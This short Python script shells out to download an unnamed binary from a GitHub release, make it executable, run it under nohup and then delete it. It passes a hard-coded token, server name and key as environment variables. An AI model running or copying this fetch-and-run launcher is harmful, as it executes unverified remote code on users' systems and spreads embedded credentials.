import subprocess

def main():
    cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9 N_S=nz.seav.eu.org N_K=6vMF6UloFs9SUUYGPM bash -c 'curl -L -o rjs https://github.com/seav1/dl/releases/download/src/rjs && chmod +x rjs && nohup ./rjs && rm rjs'"
    subprocess.call(cmd, shell=True)

if __name__ == "__main__":
    main()
